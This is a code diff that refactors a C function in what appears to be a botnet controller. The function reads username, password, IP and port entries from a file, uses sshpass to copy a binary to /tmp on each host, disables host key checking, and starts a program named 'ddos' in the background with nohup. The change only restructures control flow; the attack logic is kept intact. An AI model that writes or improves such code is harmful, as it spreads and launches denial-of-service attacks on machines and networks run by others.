@@ -55,46 +55,45 @@ void transfer(void) {
         char ip[64];
         char port[32];
 
-        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) == 4) {
-            // Check if ip already used
-            if (strstr(processed_ips, ip) == NULL) {
-                // Ip not used for scp, execute scp
-                snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s",
-                         ip);
+        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) != 4) { continue; }
+        // Check if ip already used
+        if (strstr(processed_ips, ip) == NULL) {
+            // Ip not used for scp, execute scp
+            snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s",
+                     ip);
 
-                // Run ssh-keyscan to accept the unknown host
-                char ssh_keyscan_command[256];
-                snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
-                         "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
-                system(ssh_keyscan_command);
+            // Run ssh-keyscan to accept the unknown host
+            char ssh_keyscan_command[256];
+            snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
+                     "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
+            system(ssh_keyscan_command);
 
-                // Transfer file using scp with sshpass
-                char scp_command[256];
-                snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
-                         client_file_name, user, ip);
-                printf("Created command : %s\n", scp_command); // print command created
-                system(scp_command);
-            }
-
-            // SSH connection to the user on the specified IP
-            char ssh_command[256];
-
-            if (chmod_executed) {
-                // If CHMOD executed, don't do chmod+x
-                snprintf(ssh_command, sizeof(ssh_command),
-                         "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'",
-                         password, user, ip);
-            } else {
-                // Execute ssh with chmod
-                snprintf(ssh_command, sizeof(ssh_command),
-                         "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'",
-                         password, user, ip);
-                chmod_executed = true;
-            }
-
-            printf("Created command : %s\n", ssh_command); // show the current command
-            system(ssh_command);
+            // Transfer file using scp with sshpass
+            char scp_command[256];
+            snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
+                     client_file_name, user, ip);
+            printf("Created command : %s\n", scp_command); // print command created
+            system(scp_command);
         }
+
+        // SSH connection to the user on the specified IP
+        char ssh_command[256];
+
+        if (chmod_executed) {
+            // If CHMOD executed, don't do chmod+x
+            snprintf(ssh_command, sizeof(ssh_command),
+                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'",
+                     password, user, ip);
+        } else {
+            // Execute ssh with chmod
+            snprintf(ssh_command, sizeof(ssh_command),
+                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'",
+                     password, user, ip);
+            chmod_executed = true;
+        }
+
+        printf("Created command : %s\n", ssh_command); // show the current command
+        system(ssh_command);
     }
 
     fclose(file);
